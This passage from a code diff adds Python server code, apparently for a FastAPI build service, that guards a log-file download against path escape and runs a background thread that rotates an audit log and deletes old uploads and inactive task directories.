+        if not str(real).startswith(str(base_logs.resolve())):
+            raise HTTPException(status_code=403, detail="Forbidden")
+    except FileNotFoundError:
+        raise HTTPException(status_code=404, detail="File missing")
+    return FileResponse(path=str(real), filename="build.log", media_type="text/plain")
+
+# Recover tasks and start retention
+def recover_tasks_from_disk():
+    try:
+        for date_dir in TASKS_ROOT.iterdir():
+            if not date_dir.is_dir():
+                continue
+            for task_dir in date_dir.iterdir():
+                try:
+                    if not task_dir.is_dir():
+                        continue
+                    # Skip active tasks
+                    if _is_task_active(task_dir):
+                        continue
+                    # Age check: use directory mtime
+                    mtime = datetime.utcfromtimestamp(task_dir.stat().st_mtime)
+                    if mtime < datetime.utcnow() - timedelta(days=RETAIN_TASK_DAYS):
+                        shutil.rmtree(task_dir, ignore_errors=True)
+                except Exception:
+                    continue
+            # Remove empty date directories
+            try:
+                if not any(date_dir.iterdir()):
+                    date_dir.rmdir()
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+def _rotate_audit_log():
+    try:
+        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
+        if not AUDIT_LOG.exists():
+            return
+        if AUDIT_LOG.stat().st_size <= AUDIT_MAX_BYTES:
+            return
+        # Rotate: audit.jsonl.N ... audit.jsonl.1
+        for i in range(AUDIT_BACKUPS, 0, -1):
+            src = AUDIT_LOG.with_name(f"audit.jsonl.{i}")
+            dst = AUDIT_LOG.with_name(f"audit.jsonl.{i+1}")
+            if src.exists():
+                if i == AUDIT_BACKUPS:
+                    try:
+                        src.unlink()
+                    except Exception:
+                        pass
+                else:
+                    try:
+                        src.rename(dst)
+                    except Exception:
+                        pass
+        # Move current to .1 and recreate empty
+        try:
+            AUDIT_LOG.rename(AUDIT_LOG.with_name("audit.jsonl.1"))
+        except Exception:
+            return
+        try:
+            AUDIT_LOG.touch()
+        except Exception:
+            pass
+    except Exception:
+        pass
+
+def _is_task_active(task_dir: Path) -> bool:
+    try:
+        status_path = task_dir / "logs" / "status.json"
+        if not status_path.exists():
+            return True  # conservatively treat as active if no status
+        data = json.loads(status_path.read_text())
+        state = data.get("state", "")
+        return state in (TaskStatus.SUBMITTED, TaskStatus.PREPARING, TaskStatus.RUNNING)
+    except Exception:
+        return True
+
+def _cleanup_uploads_and_tasks():
+    now = datetime.utcnow()
+    # Cleanup uploads
+    try:
+        cutoff_upload = now - timedelta(hours=RETAIN_UPLOAD_HOURS)
+        for f in UPLOADS_ROOT.glob("*"):
+            try:
+                if f.is_file():
+                    mtime = datetime.utcfromtimestamp(f.stat().st_mtime)
+                    if mtime < cutoff_upload:
+                        f.unlink()
+            except Exception:
+                continue
+    except Exception:
+        pass
+    # Cleanup tasks
+    try:
+        cutoff_tasks = now - timedelta(days=RETAIN_TASK_DAYS)
+        if TASKS_ROOT.exists():
+            for date_dir in TASKS_ROOT.iterdir():
+                if not date_dir.is_dir():
+                    continue
+                for task_dir in date_dir.iterdir():
+                    try:
+                        if not task_dir.is_dir():
+                            continue
+                        # Skip active tasks
+                        if _is_task_active(task_dir):
+                            continue
+                        # Age check: use directory mtime
+                        mtime = datetime.utcfromtimestamp(task_dir.stat().st_mtime)
+                        if mtime < cutoff_tasks:
+                            shutil.rmtree(task_dir, ignore_errors=True)
+                    except Exception:
+                        continue
+                # Remove empty date directories
+                try:
+                    if not any(date_dir.iterdir()):
+                        date_dir.rmdir()
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+def _retention_cycle():
+    if not RETENTION_ENABLED:
+        return
+    _rotate_audit_log()
+    _cleanup_uploads_and_tasks()
+    # Optional: DB cleanup (best-effort)
+    if 'DB_ENABLED' in globals() and globals().get('DB_ENABLED') and globals().get('DB'):
+        try:
+            DB.cleanup_old_records(days=max(RETAIN_TASK_DAYS, 7))
+        except Exception:
+            pass
+
+def _start_retention_thread():
+    if not RETENTION_ENABLED:
+        return
+    def loop():
+        while True:
+            try:
+                _retention_cycle()
+            except Exception:
+                pass
+            time.sleep(max(RETENTION_CHECK_INTERVAL_MIN, 5) * 60)
+    threading.Thread(target=loop, daemon=True).start()
+
+recover_tasks_from_disk()
+_start_retention_thread()
 
 if __name__ == "__main__":
     import uvicorn
